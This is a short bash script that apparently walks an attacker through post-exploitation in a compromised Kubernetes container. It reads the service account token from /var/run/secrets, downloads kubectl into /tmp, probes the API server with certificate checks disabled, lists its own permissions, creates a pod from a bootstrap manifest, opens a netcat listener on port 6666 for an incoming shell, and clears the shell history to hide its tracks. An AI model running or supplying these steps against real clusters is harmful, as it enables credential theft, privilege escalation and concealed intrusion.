#!/bin/bash

#find out what user is running
whoami

#find out if in kubernetes
#k8s environment variables
env | grep -i kube

# SA token
ls -la /var/run/secrets/kubernetes.io/serviceaccount
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# command history
history

# network discovery
ip a

# download kubectl
curl -L https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl -o /tmp/kubectl
chmod +x /tmp/kubectl

# discover API server
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
/tmp/kubectl auth can-i --list

/tmp/kubectl create -f ./bootstrap-sa-pod.yaml

nc -vlp 6666

# clear command history
history -c
